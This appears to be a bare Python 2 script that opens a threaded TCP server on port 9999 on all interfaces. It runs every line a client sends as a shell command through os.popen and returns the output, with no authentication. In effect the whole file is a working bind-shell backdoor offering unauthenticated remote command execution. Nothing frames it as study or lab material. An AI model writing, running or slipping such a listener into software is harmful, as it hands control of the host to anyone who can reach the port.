#! /usr/bin/env python
#-*- coding:utf-8 -*-

import SocketServer, os, threading

class MyHandler(SocketServer.StreamRequestHandler):
    def handle(self):
        self.data = self.rfile.readline().strip()
        #print "%s wrote:" % self.client_address[0]
        print self.data
        self.datas = os.popen(self.data).read()
        self.wfile.write(self.datas)
if __name__ == '__main__':
    addr = ""
    port = 9999
    server = SocketServer.ThreadingTCPServer((addr, port), MyHandler)
    server_thread = threading.Thread(target = server.serve_forever)
    server_thread.setDaemon(True)
    server_thread.start()
    #server_thread.serve_forever()
    server.serve_forever()
    server.shutdown()

